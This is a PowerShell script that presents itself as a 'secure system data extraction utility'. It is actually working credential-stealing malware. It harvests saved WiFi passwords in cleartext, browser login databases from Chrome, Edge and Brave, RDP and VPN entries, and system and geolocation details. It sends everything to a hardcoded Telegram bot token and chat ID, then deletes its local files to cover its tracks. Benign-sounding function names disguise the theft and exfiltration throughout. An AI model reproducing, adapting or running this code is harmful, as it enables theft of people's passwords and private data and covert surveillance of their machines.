# Secure System Data Extraction Utility
# Comprehensive data collection with secure transmission

param(
    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFFJ2ZbhtJs",
    [string]$CommChannel = "2047893044"
)

# Function to get public IP information
function Get-NetworkLocationData {
    try {
        Write-Host "Acquiring network location data..." -ForegroundColor Yellow
        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
        return @{
            PublicIP = $ipInfo.ip
            Country = $ipInfo.country
            Region = $ipInfo.region
            City = $ipInfo.city
            Org = $ipInfo.org
            Loc = $ipInfo.loc
            Timezone = $ipInfo.timezone
        }
    } catch {
        Write-Host "Network location data unavailable: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            PublicIP = "Undetermined"
            Country = "Undetermined"
            Region = "Undetermined"
            City = "Undetermined"
            Org = "Undetermined"
            Loc = "Undetermined"
            Timezone = "Undetermined"
        }
    }
}

# Function to get detailed system information
function Get-SystemSpecifications {
    $computerInfo = Get-ComputerInfo
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
    $biosInfo = Get-WmiObject -Class Win32_BIOS
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
    
    return @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        OSName = $osInfo.Caption
        OSVersion = $osInfo.Version
        OSBuild = $osInfo.BuildNumber
        BIOSSerial = $biosInfo.SerialNumber
        Processor = $processorInfo.Name
        ProcessorCores = $processorInfo.NumberOfCores
        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
    }
}

# Function to get user profile information
function Get-UserProfileData {
    Write-Host "Collecting user profile information..." -ForegroundColor Yellow
    
    try {
        $userPath = [Environment]::GetFolderPath("UserProfile")
        $userInfo = @{
            FullName = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName
            UserName = $env:USERNAME
            ProfilePath = $userPath
            SID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).SID
            Domain = $env:USERDOMAIN
        }

        # Try to get email from registry (common locations)
        try {
            $mailClients = @(
                "HKCU:\Software\Microsoft\IdentityCRL",
                "HKCU:\Software\Microsoft\Office",
                "HKCU:\Software\Google\Chrome",
                "HKCU:\Software\Mozilla\Firefox"
            )
            
            foreach ($path in $mailClients) {
                if (Test-Path $path) {
                    $email = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | 
                            Select-Object -ExpandProperty "Email" -ErrorAction SilentlyContinue
                    if ($email) {
                        $userInfo.Email = $email
                        break
                    }
                }
            }
        } catch {
            $userInfo.Email = "Not detected"
        }

        # Get profile picture path
        try {
            $picturePath = Join-Path $userPath "Pictures"
            if (Test-Path $picturePath) {
                $userInfo.ProfilePicturesPath = $picturePath
            }
        } catch {
            $userInfo.ProfilePicturesPath = "Not accessible"
        }

        $userInfo.ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        return $userInfo

    } catch {
        Write-Host "User profile collection error: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            UserName = $env:USERNAME
            Error = $_.Exception.Message
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
    }
}

# Function to extract detailed WiFi information
function Get-WirelessNetworkData {
    Write-Host "Acquiring wireless network configurations..." -ForegroundColor Yellow
    
    $wifiProfiles = @()
    
    try {
        # Get all WiFi profiles
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_.ToString().Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                # Get detailed WiFi profile information
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $profileDetails = @{}
                
                foreach ($line in $profileInfo) {
                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
                        $key = $matches[1].Trim()
                        $value = $matches[2].Trim()
                        $profileDetails[$key] = $value
                    }
                }
                
                # Replace null coalescing operator with compatible syntax
                $keyContent = if ($profileDetails["Key Content"]) { $profileDetails["Key Content"] } else { "No security key" }
                $authentication = if ($profileDetails["Authentication"]) { $profileDetails["Authentication"] } else { "Unknown" }
                $encryption = if ($profileDetails["Cipher"]) { $profileDetails["Cipher"] } else { "Unknown" }
                $connectionMode = if ($profileDetails["Connection mode"]) { $profileDetails["Connection mode"] } else { "Unknown" }
                $networkType = if ($profileDetails["Network type"]) { $profileDetails["Network type"] } else { "Unknown" }
                $radioType = if ($profileDetails["Radio type"]) { $profileDetails["Radio type"] } else { "Unknown" }
                $ssidName = if ($profileDetails["SSID name"]) { $profileDetails["SSID name"] } else { $profile }
                
                $wifiProfiles += @{
                    SSID = $profile
                    Password = $keyContent
                    Authentication = $authentication
                    Encryption = $encryption
                    ConnectionMode = $connectionMode
                    NetworkType = $networkType
                    RadioType = $radioType
                    SSIDName = $ssidName
                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            } catch {
                Write-Host "Wireless profile $profile processing error" -ForegroundColor Red
            }
        }
        
        return @{
            Profiles = $wifiProfiles
            TotalNetworks = $wifiProfiles.Count
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        
    } catch {
        Write-Host "Wireless data acquisition failed: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            Profiles = @()
            TotalNetworks = 0
            Error = $_.Exception.Message
            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
    }
}

# Function to extract RDP/VPN credentials
function Get-RemoteConnectionData {
    Write-Host "Gathering remote connection configurations..." -ForegroundColor Yellow
    
    $remoteData = @{
        RDPConnections = @()
        VPNConnections = @()
        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
    
    try {
        # Check RDP connections
        try {
            $rdpPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
            if (Test-Path $rdpPath) {
                $rdpServers = Get-ChildItem -Path $rdpPath -ErrorAction SilentlyContinue
                foreach ($server in $rdpServers) {
                    $serverName = $server.PSChildName
                    $username = Get-ItemProperty -Path $server.PSPath -Name "UsernameHint" -ErrorAction SilentlyContinue
                    $usernameHint = if ($username.UsernameHint) { $username.UsernameHint } else { "Not stored" }
                    
                    $remoteData.RDPConnections += @{
                        Server = $serverName
                        UsernameHint = $usernameHint
                    }
                }
            }
        } catch {
            Write-Host "RDP data collection issue" -ForegroundColor Yellow
        }
        
        # Check VPN connections
        try {
            $vpnPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
            if (Test-Path $vpnPath) {
                $vpnConnections = Get-ChildItem -Path $vpnPath -ErrorAction SilentlyContinue
                foreach ($connection in $vpnConnections) {
                    if ($connection.PSChildName -match "VPN") {
                        $remoteData.VPNConnections += @{
                            Name = $connection.PSChildName
                            ConfigPath = $connection.PSPath
                        }
                    }
                }
            }
        } catch {
            Write-Host "VPN data collection issue" -ForegroundColor Yellow
        }
        
        return $remoteData
        
    } catch {
        Write-Host "Remote connection data error: $($_.Exception.Message)" -ForegroundColor Red
        return $remoteData
    }
}

# Secure communication function
function Invoke-SecureDelivery {
    param(
        [string]$ContentPath,
        [string]$Description
    )
    
    try {
        if (-not (Test-Path $ContentPath)) {
            Write-Host "Content file not found: $ContentPath" -ForegroundColor Red
            return $false
        }
        
        # Ensure file is fully written
        $maxWait = 30
        $waitTime = 0
        while ($waitTime -lt $maxWait) {
            try {
                $file = Get-Item $ContentPath
                if ($file.Length -gt 0) {
                    break
                }
            } catch {}
            Start-Sleep -Seconds 1
            $waitTime++
        }
        
        $fileBytes = [System.IO.File]::ReadAllBytes($ContentPath)
        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $delimiter = [System.Guid]::NewGuid().ToString()
        $lineBreak = "`r`n"
        
        $payload = (
            "--$delimiter",
            "Content-Disposition: form-data; name=`"channel_id`"",
            "",
            $CommChannel,
            "--$delimiter",
            "Content-Disposition: form-data; name=`"description`"",
            "",
            $Description,
            "--$delimiter",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $ContentPath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileContent,
            "--$delimiter--"
        ) -join $lineBreak

        $endpoint = "https://api.telegram.org/bot$CommToken/sendDocument"
        
        $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=$delimiter" -Body $payload
        
        if ($response.ok) {
            Write-Host "Content delivered successfully: $(Split-Path $ContentPath -Leaf)" -ForegroundColor Green
            return $true
        } else {
            Write-Host "Delivery issue: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "Secure delivery error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Secure message function
function Send-SecureNotification {
    param([string]$MessageText)
    
    try {
        $endpoint = "https://api.telegram.org/bot$CommToken/sendMessage"
        $payload = @{
            channel_id = $CommChannel
            text = $MessageText
            parse_mode = "HTML"
        }
        
        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $payload -ContentType "application/json"
        
        if ($response.ok) {
            Write-Host "Notification sent" -ForegroundColor Green
            return $true
        } else {
            Write-Host "Notification issue: $($response.description)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "Notification error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to install SQLite3 if needed
function Install-DatabaseTool {
    try {
        Write-Host "Setting up database utility..." -ForegroundColor Yellow
        $toolUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
        $archivePath = "sqlite-temp.zip"
        
        Invoke-WebRequest -Uri $toolUrl -OutFile $archivePath -UseBasicParsing
        Expand-Archive -Path $archivePath -DestinationPath ".\sqlite-temp" -Force
        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" -Force
        
        Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "Database utility ready" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Database setup failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to extract browser encrypted passwords
function Get-BrowserStorageData {
    param(
        [string]$BrowserDataPath,
        [string]$BrowserName
    )
    
    $browserConfig = @{
        "Chrome" = @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "Edge" = @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        "Brave" = @{ Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
    }
    
    $loginDataFiles = @()
    $results = @()
    $encryptedData = @()
    
    if (-not (Test-Path $BrowserDataPath)) {
        Write-Host "$BrowserName data directory not found" -ForegroundColor Yellow
        return @{ Summary = @(); DetailedData = @() }
    }
    
    # Check default profile
    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
    if (Test-Path $defaultLoginData) {
        $loginDataFiles += @{ Path = $defaultLoginData; Profile = "Default" }
    }
    
    # Check other profiles
    $profilePatterns = @("Profile *", "Profile*", "User *", "User*")
    foreach ($pattern in $profilePatterns) {
        $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter $pattern -ErrorAction SilentlyContinue
        foreach ($profileDir in $profileDirs) {
            $loginDataPath = Join-Path $profileDir.FullName "Login Data"
            if (Test-Path $loginDataPath) {
                $loginDataFiles += @{ Path = $loginDataPath; Profile = $profileDir.Name }
            }
        }
    }
    
    if ($loginDataFiles.Count -eq 0) {
        Write-Host "No login databases found for $BrowserName" -ForegroundColor Yellow
        return @{ Summary = @(); DetailedData = @() }
    }
    
    Write-Host "Found $($loginDataFiles.Count) databases for $BrowserName" -ForegroundColor Green
    
    foreach ($loginDataFile in $loginDataFiles) {
        $dbPath = $loginDataFile.Path
        $profileName = $loginDataFile.Profile
        
        Write-Host "  Processing profile: $profileName" -ForegroundColor Cyan
        
        try {
            $tempDbPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
            Copy-Item $dbPath $tempDbPath -Force
            
            $tempOutputPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
            
            $query = "SELECT origin_url, username_value, hex(password_value) as password_hex FROM logins;"
            & .\sqlite3.exe -csv -header $tempDbPath $query > $tempOutputPath
            
            if (Test-Path $tempOutputPath) {
                $logins = Import-Csv $tempOutputPath
                Write-Host "    Found $($logins.Count) entries" -ForegroundColor Green
                
                foreach ($login in $logins) {
                    $entryId = [System.Guid]::NewGuid().ToString()
                    
                    $encryptedEntry = @{
                        Id = $entryId
                        Browser = $BrowserName
                        Profile = $profileName
                        URL = $login.origin_url
                        Username = $login.username_value
                        HexData = $login.password_hex
                        DataLength = if ($login.password_hex) { $login.password_hex.Length / 2 } else { 0 }
                        EncryptionVersion = "Unknown"
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                    
                    # Detect encryption version
                    if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$" -and $login.password_hex.Length -ge 6) {
                        try {
                            $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16), 
                                          [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
                                          [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
                            $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
                            
                            if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
                                $encryptedEntry.EncryptionVersion = $prefix
                            }
                        } catch {}
                    }
                    
                    $encryptedData += $encryptedEntry
                    $results += [PSCustomObject]@{
                        ID = $entryId
                        Browser = $BrowserName
                        Profile = $profileName
                        URL = $login.origin_url
                        Username = $login.username_value
                        EncryptionVersion = $encryptedEntry.EncryptionVersion
                        DataLength = $encryptedEntry.DataLength
                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    }
                }
                
                Remove-Item $tempOutputPath -Force -ErrorAction SilentlyContinue
            }
            
            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
            
        } catch {
            Write-Host "    Profile $profileName processing error" -ForegroundColor Red
        }
    }
    
    return @{
        Summary = $results
        DetailedData = $encryptedData
    }
}

# Main execution
Write-Host "Secure System Data Collection Utility" -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Green

# Collect all data
$networkInfo = Get-NetworkLocationData
$systemSpecs = Get-SystemSpecifications
$userProfile = Get-UserProfileData
$wirelessData = Get-WirelessNetworkData
$remoteConnections = Get-RemoteConnectionData

$timestamp = Get-Date -Format "ddMMyyyy"
$uniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
$filePrefix = "$($networkInfo.PublicIP)_$($networkInfo.Country)_$($networkInfo.Region)_${timestamp}_${uniqueId}"

$browserDataPath = Join-Path $PWD "${filePrefix}_browser_data.json"
$systemDataPath = Join-Path $PWD "${filePrefix}_system_data.json"

Write-Host "Data collection completed" -ForegroundColor Green
Write-Host "Files will be created as:" -ForegroundColor Yellow
Write-Host "Browser Data: $browserDataPath" -ForegroundColor Cyan
Write-Host "System Data: $systemDataPath" -ForegroundColor Cyan

# Install SQLite if needed
if (-not (Test-Path ".\sqlite3.exe")) {
    if (-not (Install-DatabaseTool)) {
        Write-Host "Database tool required. Exiting." -ForegroundColor Red
        exit 1
    }
}

# Extract browser data
$browserData = @{}
$browsersToCheck = @("Chrome", "Edge", "Brave")

foreach ($browser in $browsersToCheck) {
    Write-Host "`nProcessing $browser..." -ForegroundColor Yellow
    $browserPath = "$env:LOCALAPPDATA\$($browser.Replace(' ', ''))\User Data"
    $result = Get-BrowserStorageData -BrowserDataPath $browserPath -BrowserName $browser
    $browserData[$browser] = $result
}

# Create consolidated data files
$consolidatedBrowserData = @{
    Metadata = @{
        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        PublicIP = $networkInfo.PublicIP
        Country = $networkInfo.Country
        Region = $networkInfo.Region
        City = $networkInfo.City
        ComputerName = $systemSpecs.ComputerName
        UserName = $systemSpecs.UserName
    }
    BrowserData = $browserData
}

$consolidatedSystemData = @{
    Metadata = @{
        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        PublicIP = $networkInfo.PublicIP
        Country = $networkInfo.Country
        Region = $networkInfo.Region
        City = $networkInfo.City
    }
    SystemSpecifications = $systemSpecs
    UserProfile = $userProfile
    WirelessNetworks = $wirelessData
    RemoteConnections = $remoteConnections
}

# Export to JSON files
$consolidatedBrowserData | ConvertTo-Json -Depth 10 | Out-File -FilePath $browserDataPath -Encoding UTF8
$consolidatedSystemData | ConvertTo-Json -Depth 10 | Out-File -FilePath $systemDataPath -Encoding UTF8

Write-Host "JSON files created successfully" -ForegroundColor Green

# Wait for files to be written
Write-Host "Finalizing file preparation..." -ForegroundColor Yellow
Start-Sleep -Seconds 5

# Send initial notification
$initialMessage = @"
🖥️ <b>System Data Collection Started</b>
• <b>Computer:</b> $($systemSpecs.ComputerName)
• <b>User:</b> $($systemSpecs.UserName)
• <b>Location:</b> $($networkInfo.City), $($networkInfo.Region)
• <b>IP:</b> $($networkInfo.PublicIP)
• <b>Time:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

Send-SecureNotification -MessageText $initialMessage | Out-Null

# Send files
$browserDescription = "🌐 Browser Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"
$systemDescription = "🖥️ System Data - $($systemSpecs.ComputerName) - $($networkInfo.PublicIP)"

$browserSent = Invoke-SecureDelivery -ContentPath $browserDataPath -Description $browserDescription
$systemSent = Invoke-SecureDelivery -ContentPath $systemDataPath -Description $systemDescription

# Send completion notification
$completionMessage = @"
✅ <b>Data Collection Completed</b>

📊 <b>Summary:</b>
• Browser entries: $(($browserData.Values.Summary | Measure-Object).Count)
• WiFi networks: $($wirelessData.TotalNetworks)
• RDP connections: $($remoteConnections.RDPConnections.Count)
• VPN configurations: $($remoteConnections.VPNConnections.Count)

🌍 <b>Location:</b> $($networkInfo.City), $($networkInfo.Region)
🖥️ <b>System:</b> $($systemSpecs.ComputerName)
⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

Send-SecureNotification -MessageText $completionMessage | Out-Null

# Cleanup
Write-Host "Performing cleanup..." -ForegroundColor Yellow
Get-ChildItem -Path "." -Filter "temp_*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "." -Filter "*.db" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path "." -Filter "*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# Remove JSON files after sending
if (Test-Path $browserDataPath) { Remove-Item $browserDataPath -Force -ErrorAction SilentlyContinue }
if (Test-Path $systemDataPath) { Remove-Item $systemDataPath -Force -ErrorAction SilentlyContinue }

Write-Host "Cleanup completed" -ForegroundColor Green
Write-Host "`nData collection and transmission finished successfully" -ForegroundColor Green
